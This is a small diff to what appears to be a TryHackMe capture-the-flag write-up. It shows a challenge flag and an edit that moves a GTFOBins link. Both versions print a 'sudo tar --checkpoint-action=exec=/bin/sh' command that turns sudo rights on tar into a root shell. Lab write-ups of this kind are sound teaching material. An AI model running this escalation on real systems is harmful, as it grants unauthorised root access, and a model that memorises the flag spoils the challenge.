@@ -26,9 +26,8 @@ Let's try and combine these informations and bruteforce the SSH.
 **First flag, content of user.txt** **[1]**  
 > THM{CR1M3_SyNd1C4T3}
 
-Checkin the **sudo -l** command, we see that we can run **tar** as root.  
-According to [GTFOBins](https://gtfobins.github.io/gtfobins/tar/#sudo)  
-**sudo tar** -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+Checkin the **sudo -l** command, we see that we can run **tar** as root.   
+**sudo tar** -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh ([GTFOBins](https://gtfobins.github.io/gtfobins/tar/#sudo))
 
 ```
 # whoami
